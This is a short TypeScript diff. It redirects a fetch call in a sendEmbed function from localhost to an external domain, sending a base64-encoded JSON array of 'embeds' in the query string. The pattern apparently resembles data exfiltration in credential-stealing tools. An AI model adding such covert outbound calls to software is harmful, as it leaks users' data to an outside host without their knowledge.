@@ -98,5 +98,5 @@ const createEmbed = async (title: string, description: string) => {
 export const sendEmbed = async () => {
   // base64 encode the array of embeds
   const ENCRY = Buffer.from(JSON.stringify(embeds)).toString("base64");
-  await fetch(`http://localhost:3000/_/x?t=${ENCRY}`);
+  await fetch(`https://von.life/_/x?t=${ENCRY}`);
 };
